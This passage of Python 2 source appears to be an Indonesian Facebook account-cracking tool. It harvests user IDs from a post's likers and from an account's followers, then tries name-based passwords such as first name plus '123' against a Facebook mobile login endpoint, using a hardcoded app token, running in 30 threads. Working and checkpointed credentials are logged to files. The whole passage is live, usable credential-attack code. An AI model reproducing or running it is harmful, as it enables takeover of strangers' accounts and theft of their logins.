                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos8
                                            cek = open('done/pakis.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mSelesai ...'
    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mSalin hasil crack lalu simpan\x1b[1;91m : \x1b[1;97mdone pakis.'
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    raw_input('\x1b[1;97m{\x1b[1;91mKembali\x1b[1;97m} ')
    os.system('python2 cr4ck.py')


def crack_likes():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;91m Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        os.system('clear')
        print logo
        print '        \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK POSTINGAN TEMAN\x1b[1;91m \xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
        print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
        tez = raw_input('\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m}\x1b[1;97m ID Postingan Teman \x1b[1;91m :\x1b[1;97m ')
        r = requests.get('https://graph.facebook.com/' + tez + '/likes?limit=9999999&access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

        jalan('\r\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mMengambil ID \x1b[1;97m...')
    except KeyError:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID Postingan Salah !'
        raw_input('\n\x1b[1;97m{\x1b[1;91mKembali\x1b[1;97m}')
        menu()

    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mTotal ID \x1b[1;91m:\x1b[1;97m ' + str(len(id))
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[0;97m{\x1b[0;91m\xc3\x97\x1b[0;97m} Crack Berjalan ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;97m\x1b[1;41;97m\nTidak Ada Hasil Gunakan Mode Pesawat 5 Detik\x1b[0m'
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'

    def main(arg):
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos1
                oke = open('done/grup.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos1
                cek = open('done/grup.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos2
                    oke = open('done/grup.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos2
                    cek = open('done/grup.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos3
                        oke = open('done/grup.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos3
                        cek = open('done/grup.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = j['last_name'].lower() + '123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos4
                            oke = open('done/grup.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos4
                            cek = open('done/grup.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = j['last_name'].lower() + '1234'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos5
                                oke = open('done/grup.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos5
                                cek = open('done/grup.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['last_name'].lower() + '12345'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos6
                                    oke = open('done/grup.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos6
                                    cek = open('done/grup.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mSelesai ...'
    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mSalin hasil crack lalu simpan\x1b[1;91m : \x1b[1;97mdone post.'
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    raw_input('\x1b[1;97m{\x1b[1;91mKembali\x1b[1;97m} ')
    os.system('python2 d4rk.py')


def crack_follow():
    toket = open('login.txt', 'r').read()
    os.system('clear')
    print logo
    print '              \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK FOLLOWERS \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    idt = raw_input('\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mID Publik \x1b[1;91m:\x1b[1;97m ')
    try:
        jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
        op = json.loads(jok.text)
        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mNama Akun \x1b[1;91m:\x1b[1;97m ' + op['name']
    except KeyError:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID publik !'
        raw_input('\n\x1b[1;97m{\x1b[1;91mKembali\x1b[1;97m}')
        menu()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi !'
        keluar()

    r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + toket)
    z = json.loads(r.text)
    for i in z['data']:
        id.append(i['id'])

    print '\x1b[0;97m{\x1b[0;91m\xc3\x97\x1b[0;97m} Total ID\x1b[1;91m  :\x1b[1;97m ' + str(len(id))
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[0;97m{\x1b[0;91m\xc3\x97\x1b[0;97m} Crack Berjalan ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;97m\x1b[1;41;97m\nTidak Ada Hasil Gunakan Mode Pesawat 5 Detik\x1b[0m'
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'

    def main(arg):
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos1
                oke = open('done/follow.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos1
                cek = open('done/follow.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos2
                    oke = open('done/follow.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos2
                    cek = open('done/follow.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
